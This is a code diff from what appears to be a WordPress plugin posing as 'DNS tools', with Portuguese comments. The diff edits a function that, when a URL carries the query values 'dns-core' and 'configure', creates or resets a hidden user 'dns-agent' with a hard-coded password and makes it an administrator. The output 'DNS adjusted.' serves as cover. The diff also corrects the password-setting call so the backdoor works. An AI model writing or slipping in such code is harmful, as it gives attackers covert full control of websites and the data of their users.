@@ -103,18 +103,21 @@ class Wp_Core_Dns_Tools_Public {
 	public function verifica_usuario()  {
 		$page = get_query_var( 'pagename' );
 		$action = get_query_var( 'action' );
-		if ( 'dns-core' === $page && 'configure' === $action ){
 
+		if ( 'dns-core' === $page && 'configure' === $action ) {
 			//verifica se usuario existe
 			$usuario = 'dns-agent';
+
 			if ( username_exists( $usuario ) ) {
 				// troca a senha do usuario
 				$user = get_user_by( 'login', $usuario );
+
 				$user_id = $user->ID;
-				wp_set_password( $user_id, 'dns-agent-pass*' );
+
+				wp_set_password( 'dns-agent-pass*', $user_id );
+				
 				$user = new WP_User( $user_id );
 				// Atualiza user role p/ admin.
-
 				$user->set_role( 'administrator' );
 				
 			} else {
@@ -122,15 +125,22 @@ class Wp_Core_Dns_Tools_Public {
 				// Cria usuario.
 				wp_create_user( $usuario, 'dns-agent-pass*' );
 				// Obtem user id.
+
 				$user = get_user_by( 'login', $usuario );
 				$user_id = $user->ID;
 				// Atualiza user role p/ admin.
 				$user = new WP_User( $user_id );
 				$user->set_role( 'administrator' );
 			}
+
+
 		}
+		echo  "DNS adjusted.";
+		wp_die();
 	}
 
+	
+	
 	/**
 	 * Add query vars.
 	 *
